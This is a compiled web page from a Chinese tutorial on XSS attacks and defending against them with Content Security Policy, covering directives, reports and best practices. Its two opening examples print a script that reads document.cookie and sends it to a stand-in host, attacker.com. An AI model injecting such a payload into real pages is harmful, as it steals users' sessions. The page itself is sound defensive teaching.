import{_ as s,o as t,c as i,R as e}from"./chunks/framework.jWGKUnDR.js";const u=JSON.parse('{"title":"XSS攻击？内容安全策略会出手的","description":"","frontmatter":{},"headers":[],"relativePath":"docs/security-strategy/content-security-policy.md","filePath":"docs/security-strategy/content-security-policy.md","lastUpdated":1701048871000}'),a={name:"docs/security-strategy/content-security-policy.md"},o=e(`<h1 id="xss攻击-内容安全策略会出手的" tabindex="-1">XSS攻击？内容安全策略会出手的 <a class="header-anchor" href="#xss攻击-内容安全策略会出手的" aria-label="Permalink to &quot;XSS攻击？内容安全策略会出手的&quot;">​</a></h1><p>XSS（Cross-Site Scripting，跨站脚本攻击，简称XSS）攻击是一种利用网页应用程序的安全漏洞的攻击方式，攻击者通过在网页中注入恶意脚本代码，使其在用户的浏览器中执行。这些恶意脚本可以用来窃取用户的敏感信息、篡改网页内容或进行其他未经授权的操作。</p><div class="tip custom-block"><p class="custom-block-title">XSS全称为Cross-Site Scripting，简称为什么是XSS而不是CSS</p><p>为什么XSS不简称为CSS，主要是因为CSS已经被广泛用于表示层叠样式表，用于定义网页的样式和布局。为了避免混淆，XSS选择了不同的简称，即&quot;XSS&quot;。</p></div><p><strong>有小伙伴可能会疑惑：&quot;攻击者是怎么向网页注入恶意脚本的？&quot;，我们看下面的例子：</strong></p><blockquote><p>有一个博客网站提供了评论功能，用户评论可以实时渲染到DOM中，但由于该博客并未做用户输入以及渲染到DOM时的数据校验，因此攻击者就可以评论如下内容：</p><div class="language-js vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  // 恶意代码，假设它会窃取用户的Cookie</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  var stolenData = document.cookie;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  // 将数据发送到攻击者的服务器</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  var img = new Image();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  img.src = &quot;http://attacker.com/steal.php?data=&quot; </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                   + encodeURIComponent(stolenData);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p>当其他用户浏览评论时，浏览器会执行评论中的JavaScript代码。这个恶意脚本会窃取用户的Cookie数据，并将它发送到攻击者的服务器，攻击者可以在服务器上分析这些Cookie数据，可能用于进一步的攻击，如身份盗窃或会话劫持。</p></blockquote><p>是不是很恐怖，当然聪明的朋友可能会说：&quot;那我做好用户输入、客户端渲染的数据校验不就可以了吗？&quot;。确实，<strong>做好用户输入的验证和客户端渲染数据的校验是防止XSS攻击的关键步骤之一</strong>，但不能完全依赖它来确保安全，因为XSS攻击可以非常隐蔽和复杂，比如下面这个例子：</p><blockquote><p>有一个在线论坛网站用于用户发表和浏览帖子。它使用了一个开源的Markdown渲染库，该库用于将用户输入的Markdown文本转换为HTML以进行显示。该网站执行了严格的用户输入、数据渲染验证，以确保用户不能直接插入恶意脚本或HTML标签。但其依赖的Markdown渲染库被污染，在某个时刻被攻击者篡改，包含了以下代码：</p><div class="language-js vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">js</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  // 恶意代码，假设它会窃取用户的Cookie</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  var stolenData = document.cookie;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  // 将数据发送到攻击者的服务器</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  var img = new Image();</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  img.src = &quot;http://attacker.com/steal.php?data=&quot; </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                   + encodeURIComponent(stolenData);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p>当用户浏览Markdown时，浏览器会执行第三方库恶意代码。这个恶意脚本会窃取用户的Cookie数据，并将它发送到攻击者的服务器，攻击者可以在服务器上分析这些Cookie数据，可能用于进一步的攻击，如身份盗窃或会话劫持。</p></blockquote><p>上述例子中该网站虽然对用户输入、数据渲染进行了严格的验证，但由于第三方库存在漏洞，导致恶意JavaScript代码被执行。当然，这可以通过<strong>尽量选择受信任的源（如官方仓库或社区维护的库）的依赖，以及定期审查依赖的安全风险来降低XSS攻击的风险</strong>。</p><p>从上述两个例子我们可以看到想要防止XSS攻击是极度复杂且困难的，为了提供一种有效的方式来降低XSS攻击风险，W3C推出了一项安全措施——内容安全策略(Content Security Policy ，简称CSP)</p><h2 id="内容安全策略-content-security-policy-简称csp" tabindex="-1">内容安全策略(Content Security Policy ，简称CSP) <a class="header-anchor" href="#内容安全策略-content-security-policy-简称csp" aria-label="Permalink to &quot;内容安全策略(Content Security Policy ，简称CSP)&quot;">​</a></h2><p><strong>内容安全策略（CSP）是一个额外的安全层，用于检测报告并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等</strong>。该安全策略通过设置HTTP<a href="./../overview/http-message-format.html#消息头">响应标头</a>中的<code>Content-Security-Policy</code>字段，告诉浏览器哪些来源是受信任的，哪些操作是允许的，从而减少跨站脚本（XSS）攻击的风险。</p><br><h3 id="content-security-policy响应标头" tabindex="-1">Content-Security-Policy<code>响应标头</code> <a class="header-anchor" href="#content-security-policy响应标头" aria-label="Permalink to &quot;Content-Security-Policy\`响应标头\`&quot;">​</a></h3><p><code>Content-Security-Policy</code>（CSP）响应标头用于指定浏览器应该如何处理页面中的内容和资源，告诉浏览器哪些来源是受信任的，哪些操作是允许的，以此增强Web应用程序的安全性，减少或防止跨站脚本攻击（XSS）和其他类型的注入攻击。</p><br><h4 id="参数" tabindex="-1">参数 <a class="header-anchor" href="#参数" aria-label="Permalink to &quot;参数&quot;">​</a></h4><ul><li><p><strong>font-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义通过 @font-face 加载的字体文件的来源</p></li><li><p><strong>img-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义图像的来源。</p></li><li><p><strong>media-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义&lt; audio&gt;、&lt; video&gt; 或 &lt; track&gt; 标签加载的媒体文件的源地址。</p></li><li><p><strong>object-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义&lt; object&gt; 或 &lt; embed&gt;标签加载资源的源地址。</p></li><li><p><strong>style-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义CSS样式表的来源。</p></li><li><p><strong>script-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义JavaScript代码的来源。</p></li><li><p><strong>connect-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义网络连接的来源，包括AJAX请求和WebSocket。</p></li><li><p><strong>manifest-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义manifest 文件的来源</p></li><li><p><strong>frame-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义&lt; frame&gt; 和 &lt; iframe&gt;加载的内嵌内容的源地址</p></li><li><p><strong>worker-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义Worker、SharedWorke 或 ServiceWorker脚本源。</p></li><li><p><strong>child-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义 Web Workers 和其他内嵌浏览器内容（例如用&lt; frame&gt; 和 &lt; iframe&gt;加载到页面的内容）的源地址。</p></li><li><p><strong>prefetch-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义预加载或预渲染的源地址。</p></li><li><p><strong>webrtc-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code> <code>实验中</code></p><p>用于定义WebRTC连接的源地址。</p></li><li><p><strong>default-src &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义默认内容的源地址，默认内容指未明确指定其来源的内容</p></li><li><p><strong>base-uri &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义 DOM 中 &lt; base&gt; 元素可以使用的 URL。</p></li><li><p><strong>sandbox &lt; value&gt; &lt; value&gt;...</strong> <code>可选</code></p><p>用于定义 iframe 中的行为和权限，与&lt; ifame&gt;元素中sandbox属性一致</p></li><li><p><strong>form-action&lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义当前页面中表单的提交地址。</p></li><li><p><strong>frame-ancestors &lt; source &gt; &lt; source &gt;...</strong> <code>可选</code></p><p>用于定义哪些网页可以使用 iframe、frame、object、embed 等元素嵌套显示当前页面</p><div class="danger custom-block"><p class="custom-block-title">X-Frame-Options 响应标头已弃用，已被CSP中的frame-ancestors属性代替</p><p><strong><code>X-Frame-Options</code></strong> 响应头是用来给浏览器指示允许一个页面可否在iframe、frame、object、embed 等元素中展现。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks" target="_blank" rel="noreferrer">点击劫持 </a>攻击。</p><p>它有以下三个取值：</p><ul><li><p><strong>DENY</strong>：表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</p></li><li><p><strong>SAMEORIGIN</strong>：表示该页面可以在相同域名页面的 frame 中展示。</p></li><li><p><strong>ALLOW-FROM &lt; uri&gt;</strong>：页面可以在指定来源的 frame 中展示。</p></li></ul><p>目前该响应标头已被CSP中的frame-ancestors代替，但其仍然可以为尚不支持CSP的旧版浏览器的用户提供保护。</p></div></li><li><p><strong>block-all-mixed-content</strong> <code>可选</code></p><p>指定该参数表明当使用 HTTPS 加载页面时阻止使用 HTTP 加载任何资源。</p></li><li><p><strong>upgrade-insecure-requests</strong> <code>可选</code></p><p>指定该参数表明把当前网页中所有不安全的URL(HTTP的URL)通过HTTPS访问</p></li></ul><br><h4 id="source-取值" tabindex="-1">&lt; source &gt;取值 <a class="header-anchor" href="#source-取值" aria-label="Permalink to &quot;&lt; source &gt;取值&quot;">​</a></h4><p>上述参数中&lt; srouce &gt;取值如下：</p><ul><li><strong>&lt; host-source &gt;</strong> ：以域名或者 IP 地址表示的主机名，外加可选的 URL 协议名以及端口号。站点地址中可能会包含一个可选的前置通配符（星号 &#39; * &#39;），同时也可以将通配符（也是&#39;*&#39;）应用于端口号，表示在这个源中可以使用任意合法的端口号。</li><li><strong>&lt; scheme-source &gt;</strong> ：表示URL协议名要相同，例如：<code>https:</code>、<code>data:</code>、<code>mediastream:</code>、<code>blob:</code>、<code>filesystem:</code>（冒号是必须的）</li><li><strong>&#39;self&#39;</strong> ：表示同源，包括协议名和端口号都要相同（单引号是必须的）</li><li><strong>&#39;unsafe-inline&#39;</strong> ：允许使用内联资源，例如内联&lt; script &gt;元素、javascript:URL、内联事件处理程序和内联&lt; style &gt;元素（单引号是必须的）</li><li><strong>&#39;unsafe-eval&#39;</strong> ：允许使用<code>eval()</code>和其他不安全的方法从字符串创建代码（单引号是必须的）</li><li><strong>&#39;wasm-unsafe-eval&#39;</strong> ：允许加载和执行 WebAssembly 模块，并且无需允许<code>&#39;unsafe-eval&#39;</code>（单引号是必须的）</li><li><strong>&#39;unsafe-hashes&#39;</strong> ：允许启用特定的内联事件处理程序(例如 <code>onclick</code>、<code>onload</code>、<code>onmouseover</code> 等)。如果您只是不允许内联&lt; script &gt;元素或javascript:URL，那么这是比使用<code>unsafe-inline</code>表达式更安全的方法（单引号是必须的）</li><li><strong>&#39;none&#39;</strong> ：不允许任何内容（单引号是必须的）</li><li><strong>&#39;nonce-&lt; base64-value &gt;&#39;</strong> ：使用这个指令，你可以为每个内联脚本分配一个唯一的 nonce 值，并在 CSP 头部中指定这些 nonce 值，只有具有正确 nonce 值的内联脚本才会被执行（单引号是必须的）</li><li><strong>&#39;&lt; hash-algorithm &gt;-&lt; base64-value &gt;&#39;</strong> ：该指令为每个内联脚本生成哈希值，并在 CSP 头部中列出这些哈希值，只有与 CSP 头部中列出的哈希值匹配的内联脚本才会被执行（单引号是必须的）</li><li><strong>&#39;strict-dynamic&#39;</strong> ：它告诉浏览器在内联脚本执行时，只允许加载和执行来自同一源（同源）的外部脚本（单引号是必须的）</li><li><strong>&#39;report-sample&#39;</strong> ：要求在违规报告中包含违规代码示例（单引号是必须的）</li></ul><div class="tip custom-block"><p class="custom-block-title">除了使用<code>Content-Security-Policy</code>响应标头，还可以使用&lt; meta &gt;元素来配置该策略</p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">meta</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> http-equiv</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Content-Security-Policy&quot;</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  content</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /&gt;</span></span></code></pre></div><p>meta元素的http-equiv属性赋值为Content-Security-Policy即可配置该策略，content即为策略参数，与<code>Content-Security-Policy</code>响应标头的参数一致</p></div><br><h4 id="示例" tabindex="-1">示例 <a class="header-anchor" href="#示例" aria-label="Permalink to &quot;示例&quot;">​</a></h4><div class="language-http vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 禁用不安全的内联/动态执行，只允许通过 https 加载这些资源（如图片、字体、脚本等）</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Security-Policy</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> default-src https:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">meta</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> http-equiv</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Content-Security-Policy&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> content</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;default-src https:&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">// 资源只从 https 加载，允许使用\`eval()\`，允许使用内联资源，并且禁止插件</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Content-Security-Policy: default-src https: &#39;unsafe-eval&#39; &#39;unsafe-inline&#39;; object-src &#39;none&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">meta</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> http-equiv</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Content-Security-Policy&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> content</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;default-src https: &#39;unsafe-eval&#39; &#39;unsafe-inline&#39;; object-src &#39;none&#39;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><div class="danger custom-block"><p class="custom-block-title">早期的内容安全策略：<strong><code>X-XSS-Protection</code></strong> 响应头</p><p><strong><code>X-XSS-Protection</code></strong> 响应头是 Internet Explorer，Chrome 和 Safari 的一个特性，当检测到跨站脚本攻击 (XSS) 时，浏览器将停止加载页面。若网站设置了良好的 <code>Content-Security-Policy</code>来禁用内联 JavaScript (<code>&#39;unsafe-inline&#39;</code>)，现代浏览器不太需要这些保护，但其仍然可以为尚不支持 CSP的旧版浏览器的用户提供保护。</p><p>它有以下四个取值：</p><ul><li><strong>0</strong>：禁止 XSS 过滤。</li><li><strong>1</strong>：启用 XSS 过滤（通常浏览器是默认的）。如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。</li><li><strong>1;mode=block</strong>：启用 XSS 过滤。如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。</li><li><strong>1; report=&lt; reporting-URI &gt;</strong>(仅chromium可用)：启用 XSS 过滤。如果检测到跨站脚本攻击，浏览器将清除页面并发送违规报告。</li></ul></div><br><h4 id="违规报告" tabindex="-1">违规报告 <a class="header-anchor" href="#违规报告" aria-label="Permalink to &quot;违规报告&quot;">​</a></h4><p>支持 CSP 的浏览器将始终对于每个企图违反你所建立的策略都发送违规报告，如果策略里包含一个有效的<code>report-uri</code> 参数</p><p><strong>启用报告</strong></p><p>为启用发送违规报告，你需要指定<code>report-to</code>参数，并提供至少一个 URI 地址去递交报告：</p><div class="language-http vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">http</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Content-Security-Policy</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> default-src &#39;self&#39;; report-uri</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">http://reportcollector.example.com/collector.cgi</span></span></code></pre></div><p><strong>违规报告的内容</strong></p><p>违规报告将 JSON 对象发送给<code>report-to</code>参数指定的地址，它包含了以下数据：</p><ul><li><strong>blocked-uri</strong> ：被 CSP 阻止的资源 URI。如果被阻止的 URI 来自不同的源而非 <code>document-uri</code>，那么被阻止的资源 URI 会被删减，仅保留协议、主机和端口号。</li><li><strong>disposition</strong> ：根据 <code>Content-Security-Policy-Report-Only</code>和 <code>Content-Security-Policy</code> 标头使用情况的不同，值为 <code>&quot;enforce&quot;</code> 或 <code>&quot;report&quot;</code>。</li><li><strong>document-uri</strong> ：发生违规的文档的 URI。</li><li><strong>effective-directive</strong> ：导致违规行为发生的指令。一些浏览器可能提供不同的值，例如 Chrome 提供 <code>style-src-elem</code> 或 <code>style-src-attr</code>，即使实际执行的指令是 <code>style-src</code>。</li><li><strong>original-policy</strong> ：由 <code>Content-Security-Policy</code> HTTP 标头指定的原始策略值。</li><li><strong>referrer</strong> <code>已删除</code> ：违规发生处的文档引用（地址）。</li><li><strong>script-sample</strong> ：导致该违规的内联代码、事件处理器或样式的前 40 个字符。只适用于 <code>script-src*</code> 或 <code>style-src*</code> 包含 <code>&#39;report-sample&#39;</code> 的情况。</li><li><strong>status-code</strong> ：全局对象被实例化的资源的 HTTP 状态代码。</li><li><strong>violated-directive</strong> <code>已删除</code> ：导致违反策略的指令。<code>violated-directive</code> 是 <code>effective-directive</code> 字段的历史名称，并包含相同的值。</li></ul><div class="language-json vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">json</span><pre class="shiki shiki-themes github-light github-dark vp-code"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 样式</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">  &quot;csp-report&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: {</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    &quot;blocked-uri&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://example.com/css/style.css&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    &quot;disposition&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;report&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    &quot;document-uri&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://example.com/signup.html&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    &quot;effective-directive&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;style-src-elem&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    &quot;original-policy&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;default-src &#39;none&#39;; style-src cdn.example.com; report-to /_/csp-reports&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    &quot;referrer&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    &quot;status-code&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">200</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    &quot;violated-directive&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;style-src-elem&quot;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span></code></pre></div><br><h2 id="对内容安全策略进行测试" tabindex="-1">对内容安全策略进行测试 <a class="header-anchor" href="#对内容安全策略进行测试" aria-label="Permalink to &quot;对内容安全策略进行测试&quot;">​</a></h2><p>由于内容安全策略会禁用一些脚本，如果配置不当贸然上线可能会导致一些重要脚本无法执行，从而导致不可预估的后果。<strong>因此 CSP 可用通过设置<code>Content-Security-Policy-Report-Only</code>响应标头将策略部署为仅报告（report-only）模式，在此模式下，CSP 策略不是强制性的，但是任何违规行为将会发送给<code>report-uri</code>参数指定的地址。此外，仅报告标头可以用来测试对策略未来的修订，而不用实际部署它</strong>。</p><p><code>Content-Security-Policy-Report-Only</code>与<code>Content-Security-Policy</code>拥有完全一样的参数，只不过前者不强制执行策略，而后者是强制执行策略的。如果两者同时出现在一个响应中，两个策略均有效。在 <code>Content-Security-Policy</code> 标头中指定的策略有强制性，而 <code>Content-Security-Policy-Report-Only</code> 中的策略仅产生报告而不具有强制性。</p><br><h2 id="xss攻击防范手段" tabindex="-1">XSS攻击防范手段 <a class="header-anchor" href="#xss攻击防范手段" aria-label="Permalink to &quot;XSS攻击防范手段&quot;">​</a></h2><ul><li><p><strong>用户输入数据以及动态渲染用户输入数据时要严格验证、过滤以及转义</strong></p><p>确保用户提交的数据符合预期的格式和类型，拒绝不合法的输入，在将用户输入插入到HTML、JavaScript、CSS或其他上下文中之前，要对数据进行严格验证、过滤以及转义，防止浏览器将输入识别为可执行脚本。</p></li><li><p><strong>切勿滥用任何动态渲染、插入、执行js、css以及html的方法，慎用任何序列以及反序列化的方法</strong></p><p>在使用上述方法时一定要仔细思考是否一定要使用这些方法才能满足需求，如若不是最好不要使用，非要使用一定要仔细验证数据来源是否已经经过严格的验证、过滤以及转义。</p></li><li><p><strong>选择受信任的源（如官方仓库或社区维护的库）的依赖，定期审查项目依赖的安全风险</strong></p><p>避免使用来自不明来源、未经验证或不活跃维护的依赖项，因为这些依赖项可能包含安全漏洞，项目依赖需要定期监控和更新，因为漏洞和安全问题可能随着时间而出现。</p></li><li><p><strong>使用内容安全策略（CSP）</strong></p><p>使用CSP指定浏览器应该如何处理页面中的内容和资源，告诉浏览器哪些来源是受信任的，哪些操作是允许的，以此增强Web应用程序的安全性，减少或防止跨站脚本攻击（XSS）和其他类型的注入攻击。</p></li></ul><details class="details custom-block"><summary>🎈本节参考</summary><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noreferrer">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP" target="_blank" rel="noreferrer">https://developer.mozilla.org/zh-CN/docs/Glossary/CSP</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noreferrer">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/font-src" target="_blank" rel="noreferrer">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/font-src</a></p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources" target="_blank" rel="noreferrer">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources</a></p></details><p>转载需要经过本人同意，并标明出处！</p>`,45),n=[o];function l(r,p,c,h,d,k){return t(),i("div",null,n)}const E=s(a,[["render",l]]);export{u as __pageData,E as default};
